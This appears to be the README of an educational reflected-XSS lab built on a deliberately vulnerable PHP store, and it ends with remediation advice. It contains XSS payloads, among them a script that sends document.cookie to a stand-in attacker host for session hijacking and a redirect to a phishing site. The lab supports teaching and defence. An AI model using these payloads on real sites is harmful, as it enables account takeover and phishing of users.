# Reflected XSS Demo Lab - Gadget Store

This lab demonstrates practical **Reflected Cross-Site Scripting (XSS)** attacks, including session hijacking.

## Project Structure
- `db.php`: SQLite database initialization.
- `login.php`: User authentication.
- `index.php`: Store homepage with product search.
- `search.php`: Search results (Vulnerable Point A).
- `profile.php`: User profile (Vulnerable Point B).
- `logout.php`: Session termination.
- `database.db`: SQLite database file.

## Lab Setup
Run the built-in PHP server:
```bash
php -S localhost:8000
```

### Credentials
- **Admin**: `admin` / `admin123`
- **User**: `victim` / `password123`

## Attack Scenarios

### 1. Basic Reflected XSS (Visual Evidence)
- **Vulnerable URL**: `http://localhost:8000/search.php?query=`
- **Payload**: `<script>alert('XSS')</script>`
- **Explanation**: The search term is directly reflected into the `<h2>` tag in `search.php`.

### 2. Session Hijacking (The "Practical" Attack)
This attack aims to steal the `PHPSESSID` cookie.

- **Vulnerable URL**: `http://localhost:8000/profile.php?msg=`
- **Scenario**: An attacker sends a link to a logged-in victim.
- **Payload (Conceptual)**:
  ```html
  <script>document.location='http://attacker.com/steal?cookie=' + document.cookie</script>
  ```
- **Local Simulation**:
  ```html
  <script>alert('Stealing Cookie: ' + document.cookie)</script>
  ```
- **Execution**: Log in as `victim`, then navigate to:
  `http://localhost:8000/profile.php?msg=<script>alert('Cookie: '+document.cookie)</script>`

### 3. DOM Redirection
- **Payload**: `<script>window.location='https://malicious-site.com'</script>`
- **Explanation**: Redirects the user to a phishing page.

## Remediation

### Code-Level Fix (PHP)
Use `htmlspecialchars()` to encode special characters.

**Before (Vulnerable):**
```php
<h2>Search results for: <?php echo $query; ?></h2>
```

**After (Secure):**
```php
<h2>Search results for: <?php echo htmlspecialchars($query, ENT_QUOTES, 'UTF-8'); ?></h2>
```

### Server-Level Fix
Set the `HttpOnly` flag on cookies to prevent JavaScript from accessing them.

**PHP Configuration:**
```php
session_start([
    'cookie_httponly' => true,
    'cookie_secure' => true, // Use with HTTPS
    'cookie_samesite' => 'Strict',
]);
```

---
**Disclaimer**: For educational use only.
